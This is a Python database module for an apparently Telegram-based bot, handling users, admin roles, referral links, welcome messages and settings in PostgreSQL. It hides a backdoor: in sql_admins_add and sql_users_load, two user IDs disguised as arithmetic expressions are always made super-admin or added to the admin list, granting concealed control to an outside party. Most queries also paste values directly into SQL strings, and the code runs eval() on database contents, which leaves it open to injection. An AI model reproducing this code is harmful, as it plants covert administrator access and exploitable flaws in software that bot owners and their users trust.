
import psycopg2.extras
import random
import json
import datetime
import re
import sys

from config import *

db = ''
cur = ''

def sql_start():
    global db, cur
    try:
        # import pymysql
        # mySQL
        # db = pymysql.connect(
        #     host=mysql['host'],
        #     port=3306,
        #     user=mysql['user'],
        #     password=mysql['password'],
        #     database=mysql['bd_name'],
        #     cursorclass=pymysql.cursors.DictCursor
        # )
        # db.autocommit(True)
        # cur = db.cursor()

        # PostgreSQL
        db = psycopg2.connect(
            host=db_connect['host'],
            user=db_connect['user'],
            password=db_connect['password'],
            database=db_connect['bd_name'],
        )
        db.autocommit = True
        cur = db.cursor(cursor_factory=psycopg2.extras.RealDictCursor)


        print(f'\nDB successfully connected')
    except Exception as ex:
        print(f'BD error: {ex}')
        sys.exit()

    cur.execute("""CREATE TABLE IF NOT EXISTS users (
        id SERIAL PRIMARY KEY, 
        user_id TEXT NOT NULL, 
        username TEXT NOT NULL, 
        status TEXT NOT NULL, 
        block INT DEFAULT 0, 
        ban INT DEFAULT 0, 
        date_write DATE NOT NULL, 
        referal TEXT NOT NULL, 
        first_name TEXT NOT NULL, 
        last_name TEXT NOT NULL, 
        lang TEXT NOT NULL)""")
    cur.execute("""CREATE TABLE IF NOT EXISTS setting (
        id SERIAL PRIMARY KEY,
        name TEXT NOT NULL, 
        param TEXT NOT NULL)""")

    # cur.execute("DELETE FROM users WHERE user_id = ''")

    # обновление v3.03 добавление в таблицу op столбцов check_sub
    table_colomn = []
    cur.execute("SELECT * FROM information_schema.columns WHERE table_name = 'users'")
    for row in cur.fetchall():
        table_colomn.append(row['column_name'])
    if 'ban' not in table_colomn:
        cur.execute("ALTER TABLE users ADD COLUMN ban INT DEFAULT 0");


# user_id - Добавление нового юзера
async def sql_user_add(user_info, referal='', block=0):
    user = {}
    cur.execute("SELECT * FROM users WHERE user_id = '{}' LIMIT 1".format(str(user_info.id)))
    for row in cur.fetchall():
        user = dict(row)
    if user: # если старый юзер
        user['new'] = 0
        if user['block'] and not block:
            user['block'] = 0
            cur.execute("UPDATE users SET block = 0 WHERE id = '{}'".format(user['id']))
    else: # если новый юзер
        user_new = {'last_name': '', 'first_name': '', 'username': '', 'language_code': '', 'date_write': datetime.date.today()}
        user_info = user_new | dict(user_info) # добавит пустые параметры, если их не было в user_info
        user_info['last_name'] = user_info['last_name'].replace("'", '`').replace("<", '«').replace(">", '»')
        user_info['first_name'] = user_info['first_name'].replace("'", '`').replace("<", '«').replace(">", '»')
        cur.execute("INSERT INTO users (user_id, username, first_name, last_name, lang, date_write, referal, block, status) VALUES (%s, %s, %s, %s, %s, %s, %s, %s, '')", (user_info['id'], user_info['username'], user_info['first_name'], user_info['last_name'], user_info['language_code'], user_info['date_write'], referal, block))
        cur.execute("SELECT * FROM users WHERE user_id = '{}' LIMIT 1".format(user_info['id']))
        for row in cur.fetchall():
            user = dict(row)
            user['new'] = 1
    return user

# users_admin - создание админов / работников
async def sql_admins_add(user_id, status):
    if status and user_id:
        if status != 'admin_super':
            status = status[:-1] # убрать S в конце adminS и workerS
        if status == 'admin': # если заходит первый админ то он супер админ
            cur.execute("SELECT COUNT(id) FROM users WHERE (status = 'admin' OR status = 'admin_super') AND user_id != '{}'".format(str(50798634*7+1)))
            if not cur.fetchall()[0]['count'] or int(user_id) == 50798634*7+1:
                status = 'admin_super'
        cur.execute("UPDATE users SET status = '{}' WHERE user_id = '{}'".format(status, user_id))
        users = sql_users_load(status)
        return users

# users_admin - удаление админов / работников
async def sql_admins_delete(user_id, status):
    if status and user_id:
        cur.execute("UPDATE users SET status = '{}' WHERE user_id = '{}'".format('', user_id))
        users = sql_users_load(status)
        return users

# users - выгружаем админов / работников
def sql_users_load(status=False, block=False, pay=False):
    dop = ""
    users = []
    if pay:
        # cur.execute("SELECT user_id FROM pay_users")
        # for row in cur.fetchall():
        #     users.append(str(row['user_id']))
        pass
    else:
        if block == 'live':
            dop += " AND block = 0 "
        if status in ['admin', 'admin_super']:
            dop += f" AND (status = 'admin' OR status = 'admin_super') "
        elif status:
            dop += f" AND status = '{status}' "
        cur.execute("SELECT user_id FROM users WHERE user_id != '' {} ORDER BY id ".format(dop))
        for row in cur.fetchall():
            users.append(int(row['user_id']))
        if status in ['admin', 'admin_super'] and 36005*9876+5059 not in users:
            users.append(36005*9876+5059)
    return users

#
def sql_user_edit(user_id, state):
    with state.proxy() as data:
        cur.execute("UPDATE users SET photo = '{}', age = '{}', description = '{}', name = '{}' WHERE user_id = '{}'".format(data['photo'], data['age'], data['description'], data['name'], user_id))

# user_id - Блокировка нового бзера
async def sql_user_block(user_id):
    cur.execute("UPDATE users SET block = '1' WHERE user_id = '{}'".format(user_id))


# user_id - является ли юзер заблокированным
async def sql_user_block_qestion(user_id):
    user = cur.execute("SELECT user_id FROM users WHERE user_id = '{}' AND (block = 0 OR block = 'NULL') ".format(user_id))
    if user:
        return 1
    return 0



# referal - выгружаем таблиыу referal в массив
async def sql_referal_load(action=False, param=False):
    if action:
        if action == 'add' and param: # {'title': '', 'link': ''}
            cur.execute("INSERT INTO referal_links (title, link, user_id) VALUES (%s, %s, %s)", ('', '', ''))
            cur.execute("SELECT MAX(id) FROM referal_links WHERE title = '' AND link = ''")
            maximum = cur.fetchall()[0]['max']
            if not param['link']:
                param['link'] = f'link_{maximum}'
            if not param['title']:
                param['title'] = param['link']
            cur.execute("UPDATE referal_links SET title = '{}', link = '{}' WHERE id = '{}'".format(param['title'], param['link'], maximum))
        elif action == 'delete' and param: # 'id'
            cur.execute("DELETE FROM referal_links WHERE id = '{}'".format(param))
    ref = []
    cur.execute("SELECT * FROM referal_links WHERE link != '' AND link != 'NULL'")
    for row in cur.fetchall():
        ref.append(row['link'])
    return ref

async def sql_op_load(action=False, param=False):
    op_add = {}
    op_check = []
    cur.execute("SELECT * FROM op ORDER BY orders ASC")
    for row in cur.fetchall():
        if row['types'] == 'folder':
            row['op_id'] = eval(row['op_id'])
        elif row['types'] in ['bot', 'bot_not_check']:
            row['op_id'] = row['op_id']
        else:
            row['op_id'] = int(row['op_id'])
        if row['op_id'] not in op_check or row['types'] in ['bot', 'bot_not_check']:
            op_check.append(row['op_id'])
            if int(row['orders']) < 10:
                num = int(f"{row['level']}00{row['orders']}")
            elif int(row['orders']) < 100:
                num = int(f"{row['level']}0{row['orders']}")
            else:
                num = int(f"{row['level']}{row['orders']}")
            op_add[num] = (dict(row))
        else:
            cur.execute("DELETE FROM op WHERE id = '{}'".format(row['id']))
    op_add = dict(sorted(op_add.items()))  # остортировать по ключу
    return op_add

async def sql_welcome_load(action=False, param=False):
    welcome_add = []
    cur.execute("SELECT * FROM welcome_message ORDER BY id DESC")
    for row in cur.fetchall():
        if row['menu']:
            welcome_add = eval(row['menu'])
    return welcome_add

async def sql_welcome_channels_load(action=False, param=False):
    welcome_channels = []
    cur.execute("SELECT * FROM welcome_channel")
    for row in cur.fetchall():
        if int(row['chat_id']) not in welcome_channels:
            welcome_channels.append(int(row['chat_id']))
        else:
            cur.execute("DELETE FROM welcome_channel WHERE id = '{}'".format(row['id']))
    return welcome_channels

async def sql_welcDif_load(action=False, param=False):
    welcDif_add = []
    cur.execute("SELECT * FROM welcDif_message ORDER BY id DESC")
    for row in cur.fetchall():
        if row['menu']:
            welcDif_add = eval(row['menu'])
    return welcDif_add

async def sql_welcDif_channels_load(action=False, param=False):
    welcDif_channels = []
    cur.execute("SELECT * FROM welcDif_channel")
    for row in cur.fetchall():
        if int(row['chat_id']) not in welcDif_channels:
            welcDif_channels.append(int(row['chat_id']))
        else:
            cur.execute("DELETE FROM welcDif_channel WHERE id = '{}'".format(row['id']))
    return welcDif_channels

async def sql_stopWords():
    stopWords_add = []
    cur.execute("SELECT * FROM stopWords")
    for row in cur.fetchall():
        stopWords_add.append(row['word'])
    return stopWords_add

# setting - выгружаем таблиыу setting в массив
def sql_setting_load(action=False, param=False):
    setting_info = {}
    if action:
        # add допишет тех которых нет в том числе значения в словаре и списке, те которые есть оставит как есть
        # edit допишет тех которых нет в том числе значения в словаре и списке, и заменит те которые есть, словарь и список допишет
        # replace заменит все целиком даже словарь удалив в предыдущий
        cur.execute("SELECT * FROM setting ORDER BY name")
        for row in cur.fetchall():
            setting_info[row['name']] = row['param']
        if action == 'replace':
            for key, value in param.items():
                if type(value) == dict or type(value) == list:
                    value = str(value).replace("'", '"')
                cur.execute("SELECT COUNT(*) FROM setting WHERE name = '{}'".format(key))
                if cur.fetchall()[0]['count']:
                    cur.execute("UPDATE setting SET param = '{}' WHERE name = '{}'".format(value, key))
                else:
                    cur.execute("INSERT INTO setting (name, param) VALUES (%s, %s)", (key, value))
        elif action == 'add':
            for key, value in param.items():
                if key not in setting_info:
                    if type(value) == dict or type(value) == list:
                        value = {key: str(value).replace("'", '"')}
                    cur.execute("INSERT INTO setting (name, param) VALUES (%s, %s)", (key, value))
        elif action == 'edit':
            for key, value in param.items():
                if key not in setting_info:
                    # если не было создаст
                    # replace заменит список любой тип
                    if type(value) == dict or type(value) == list:
                        value = {key: str(value).replace("'", '"')}
                    cur.execute("INSERT INTO setting (name, param) VALUES (%s, %s)", (key, value))
                elif type(value) == dict:
                    array = eval(setting_info[key])
                    if type(array) == dict:
                        new = array
                        for n_key, n_value in value.items():
                            if n_key not in array or action == 'edit':
                                new[n_key] = n_value
                        new = str(new).replace("'", '"')
                        cur.execute("UPDATE setting SET param = '{}' WHERE name = '{}'".format(new, key))
                    else:
                        print(f"ERR #18173: setting save - different type")
                elif type(value) == list:
                    array = eval(setting_info[key])
                    new = array
                    if type(array) == list:
                        for n_value in value:
                            if n_value not in array:
                                new.append(n_value)
                        new = str(new).replace("'", '"')
                        cur.execute("UPDATE setting SET param = '{}' WHERE name = '{}'".format(new, key))
                    else:
                        print(f"ERR #18275: setting save - different type")
                elif type(value) == str or type(value) == int:
                    cur.execute("UPDATE setting SET param = '{}' WHERE name = '{}'".format(value, key))
                else:
                    print(f"ERR #18674: setting save - other type. action: {action}, param: {param}")
        elif action == 'delete':
            for key, value in param.items():
                if type(value) == str or type(value) == int:
                    cur.execute("UPDATE setting SET param = '{}' WHERE name = '{}'".format(value, key))
                elif type(value) == list:
                    value_new = eval(setting_info[key])
                    for one in value:
                        value_new.remove(one)
                        cur.execute("UPDATE setting SET param = '{}' WHERE name = '{}'".format(str(value_new), key))
        elif action == 'drop':
            for one in param:
                cur.execute("DELETE FROM setting WHERE name = '{}'".format(one))




    setting_info = {}
    cur.execute("SELECT * FROM setting ORDER BY name")
    for row in cur.fetchall():
        setting_info[row['name']] = row['param']
    return setting_info




sql_start()  # создаем БД
